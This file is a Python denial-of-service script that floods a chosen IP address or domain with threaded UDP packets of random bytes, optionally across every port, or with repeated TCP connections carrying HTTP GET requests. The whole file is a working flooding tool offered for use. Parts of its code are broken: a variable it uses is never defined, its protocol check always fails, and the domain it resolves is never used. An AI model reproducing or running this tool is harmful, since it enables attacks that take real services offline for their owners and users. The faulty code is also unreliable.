import os
import sys
import random
import socket
import threading
import argparse

a=argparse.ArgumentParser()
a.add_argument("-i", help="Enter the IP address")
a.add_argument("-d", help="Enter the domain")
a.add_argument("-p", help="Enter port number (-1 for all ports only for UDP)")
a.add_argument("-t", help="Enter number of threads")
a.add_argument("-w", help="Enter either TCP or UDP")
args=a.parse_args()

ip=args.i
domain=args.d
port=int(args.p)
threads=int(args.t)
pro=args.w

protocol=str(pro).lower()

if domain != None:
    ip2= socket.gethostbyname(domain)

elif (ip==None and domain==None):
    print("You may have missed to mention either IP or Domain. You should do --")
    print("python3 args.py -h")
    sys.exit(0)

elif (port==None or threads==None):
    print("You may have missed some essential parameters like port or threads. You should do --")
    print("python3 args.py -h")
    sys.exit(0) 

elif (protocol != "udp" or protocol != "tcp"):
    print("The protocol you mentioned is neither UDP or TCP. You should do --")
    print("python3 args.py -h")
    sys.exit(0)

#socket connection provides two nodes, one to listen on and the other to connect.AF_INET indicates ipv4 while SOCK_DGRAM indicates UDP connection.
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes=random._urandom(9990)

def udp(ip, port, thread):
    c=0
    while True:
        if port==int(-1):
            total= int(65534)
            for p in range(1,total):
                s.sendto(bytes, (ip,p))
                c=c+1
                print(f"Sent {c} packets to {ip} via thread {thread}")
        else:    
            s.sendto(bytes, (ip,port))
            c=c+1
            print(f"Sent {c} packets to {ip} via thread {thread}")

def tcp(ip, port, thread):
    c=0
    while True:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
        s.connect((ip,port))
        s.sendto(("GET /"+ ip+ "HTTP/1.1\r\n").encode('ascii'), (ip,port))
        s.sendto(("Host: "+ fake_ip+ "\r\n\r\n").encode('ascii'), (ip,port))
        s.close()
        c=c+1
        print(f"Sent {c} packets to {ip} via thread {thread}")


for thread in range(threads):
    if protocol =="udp":
        threading.Thread(target=udp, args=(ip,port,thread)).start()
    elif protocol =="tcp":
        threading.Thread(target=tcp, args=(ip,port,thread)).start()
